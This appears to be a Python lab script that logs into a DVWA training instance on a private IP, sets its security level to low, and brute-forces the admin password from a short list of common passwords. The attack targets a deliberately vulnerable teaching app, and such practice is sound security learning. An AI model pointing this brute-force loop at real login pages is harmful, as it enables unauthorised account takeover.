import requests
import lxml.html
import lxml.etree as etree

# https://stackoverflow.com/questions/51381302/python-request-logging-in-to-dvwa

# Login http://10.0.1.12/DVWA/login.php
r = requests.get('http://10.0.1.12/DVWA/login.php')
print(r.url)
cookies = r.cookies.get_dict()
cookies['security'] = "low"

print(cookies)
tree = lxml.html.fromstring(r.content)
#https://stackoverflow.com/questions/29972990/python-get-value-from-input-element-with-lxml-xpath
user_token = tree.xpath("//input[@name='user_token']/@value")[0]
print(user_token)

data = {"username":"admin", "password": "password", "user_token": user_token, "Login": "Login"}
# print(data)
r = requests.post('http://10.0.1.12/DVWA/login.php', data=data, cookies=cookies)
# cookies = r.cookies.get_dict()
# print(r.content)  
print(cookies)  


r = requests.get('http://10.0.1.12/DVWA/vulnerabilities/brute/', cookies=cookies)
tree = lxml.html.fromstring(r.content)
# user_token = tree.xpath("//input[@name='user_token']/@value")[0]
inputs = tree.xpath("//form//input")
for field in inputs:
	print(field)





# <InputElement 7fc023f7fd60 name='username' type='text'>
# <InputElement 7fc023f0ea90 name='password' type='password'>
# <InputElement 7fc023f0e9f0 name='Login' type='submit'>

passwords = ['admin', 'root', 'test', 'password']

for pwd in passwords:
	print(pwd, end=" : ")
	data = {'username':'admin', 'password': pwd, 'Login': 'Login'}
	r = requests.get('http://10.0.1.12/DVWA/vulnerabilities/brute/?', params=data, cookies=cookies)
	
	# print(r.content)

	tree = lxml.html.fromstring(r.content)
	try:
		node = tree.xpath("//pre//text()")[0]
		print(node)

	except:
		print("It's the password")
# result = node.text + ''.join(etree.tostring(e) for e in node)
# print(result)
